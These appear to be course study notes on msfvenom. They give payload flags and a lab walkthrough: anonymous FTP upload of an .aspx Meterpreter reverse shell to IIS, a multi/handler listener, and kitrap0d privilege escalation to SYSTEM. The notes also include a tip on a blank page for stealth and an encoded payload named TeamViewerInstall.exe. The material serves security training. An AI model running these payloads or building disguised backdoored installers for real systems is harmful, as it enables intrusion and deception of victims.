# NOTES — Introduction to MSFVenom

## ID
612

## Module
Using the Metasploit Framework

## Kind
notes

## Title
Section 13 — Introduction to MSFVenom

## Description
Generate stand-alone payloads outside msfconsole — file formats (`.aspx`, `.exe`, raw, …), arch + platform pinning, encoder iterations. Worked example: FTP-anonymous upload of an `.aspx` Meterpreter reverse shell on IIS, then chain to `multi/handler` and `ms10_015_kitrap0d` priv-esc.

## Tags
metasploit, msfvenom, payload-generation, aspx-shell, multi-handler, local-exploit-suggester, ms10-015-kitrap0d, ftp-upload, iis

## Commands
- `nmap -sV -T4 -p- <ip>`
- `ftp <ip>` → `put reverse_shell.aspx`
- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=1337 -f aspx > reverse_shell.aspx`
- `msfconsole -q`
- `use multi/handler`
- `set LHOST <ip>` / `set LPORT 1337`
- `search local exploit suggester` → `use post/multi/recon/local_exploit_suggester` → `set session <id>` → `run`
- `search kitrap0d` → `use exploit/windows/local/ms10_015_kitrap0d`
- `set SESSION <id>` / `set LPORT <new-port>`
- `getuid`

## What This Section Covers
`msfvenom` = `msfpayload` + `msfencode` combined (post-2015). One tool to generate, encode, and write payloads in any output format for any arch/platform MSF supports.

## Why MSFVenom Beats the Old Tools
- Single command instead of `msfpayload ... | msfencode ...` pipeline
- Same encoder options (`-e`, `-i`) baked in
- More output formats (raw, exe, dll, aspx, jsp, war, asp, perl, c, python, ps1, hex, …)
- Cleans up bad-character handling with `-b`

## Core Flags
| Flag | Purpose |
|------|---------|
| `-p <payload>` | Payload module path (e.g. `windows/meterpreter/reverse_tcp`) |
| `LHOST=<ip>` | Attacker IP (consumed by payload) |
| `LPORT=<port>` | Attacker port |
| `-a <arch>` | Target arch (`x86`, `x64`, …) |
| `--platform <os>` | Target platform |
| `-f <format>` | Output format (`aspx`, `exe`, `raw`, `c`, `perl`, `js`, `ps1`, …) |
| `-e <encoder>` | Encoder (e.g. `x86/shikata_ga_nai`) |
| `-i <count>` | Encoder iterations |
| `-b "\x00"` | Forbidden / bad chars |
| `-x <template>` | Backdoor an existing executable (template) |
| `-k` | Keep template's normal execution running in a separate thread |
| `-o <file>` | Output to file |

## Worked Example — FTP Anonymous → IIS → Meterpreter → SYSTEM
1. **Scan**
   ```
   nmap -sV -T4 -p- 10.10.10.5
   # 21/tcp open  ftp     Microsoft ftpd
   # 80/tcp open  http    Microsoft IIS httpd 7.5
   ```
2. **Test FTP anon access**
   ```
   ftp 10.10.10.5
   Name: anonymous       (password: any)
   ftp> ls
   # aspnet_client  iisstart.htm  welcome.png
   ```
   `aspnet_client` directory hint → IIS will execute `.aspx`.
3. **Generate aspx Meterpreter shell**
   ```
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
   ```
4. **Upload via FTP**
   ```
   ftp> put reverse_shell.aspx
   ```
5. **Listener up first**
   ```
   msfconsole -q
   use multi/handler
   set LHOST 10.10.14.5
   set LPORT 1337
   run
   ```
6. **Trigger the payload** by browsing to `http://10.10.10.5/reverse_shell.aspx`. The page is blank; the shell fires in the background.
   ```
   [*] Meterpreter session 1 opened (10.10.14.5:1337 -> 10.10.10.5:49157)
   meterpreter > getuid
   Server username: IIS APPPOOL\Web
   ```

## Tip — Blank HTML for Stealth
The `.aspx` payload should not include any HTML — the user (or curious sysadmin) sees an empty page rather than an error, lowering suspicion.

## Chaining to Priv-Esc with `local_exploit_suggester`
With session 1 backgrounded:
```
search local exploit suggester
use post/multi/recon/local_exploit_suggester
set session 1
run
# Suggester lists candidate priv-esc modules with their assessment
```

Example output highlights:
- `exploit/windows/local/bypassuac_eventvwr` — fails because IIS user isn't in Administrators
- `exploit/windows/local/ms10_015_kitrap0d` — works against x86

Pivot to the working one:
```
search kitrap0d
use exploit/windows/local/ms10_015_kitrap0d
set SESSION 1
set LPORT 1338                        # avoid collision with first handler
run

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

## Generating With Encoding (Recap)
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 \
  -e x86/shikata_ga_nai -f exe -i 10 \
  -o ./TeamViewerInstall.exe
```
See [[07-encoders]] for why this no longer evades modern AV.

## Key Takeaways
- Generate **outside** msfconsole when the delivery vector is a file (FTP upload, web upload, email, USB) — `msfvenom` writes the payload, msfconsole handles the listener.
- `multi/handler` is the universal catcher — pair it with whatever payload you generated. Set `LHOST`/`LPORT` to match the `msfvenom` command exactly.
- Change `LPORT` on each new exploit if you still have a handler on the default 4444 — collisions silently fail.
- Use `local_exploit_suggester` for fast priv-esc triage; it's not authoritative but it's cheap.

## Gotchas
- The first time you browse to the `.aspx`, the Meterpreter session opens; the second time often errors. Browse once, then work entirely from the session.
- Some Meterpreter sessions die immediately after opening on heavily-DEP-protected hosts. Re-generate with `--platform windows -a x86` matching and consider encoding (only as a stability/bad-char fix, not for AV bypass).
- If the session dies repeatedly, check whether the IIS app pool recycles — your shell rides on the worker process and dies with it. `migrate` early.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|using-the-metasploit]]
← [[12-writing-importing-modules]] | [[14-firewall-ids-ips-evasion]] →
<!-- AUTO-LINKS-END -->
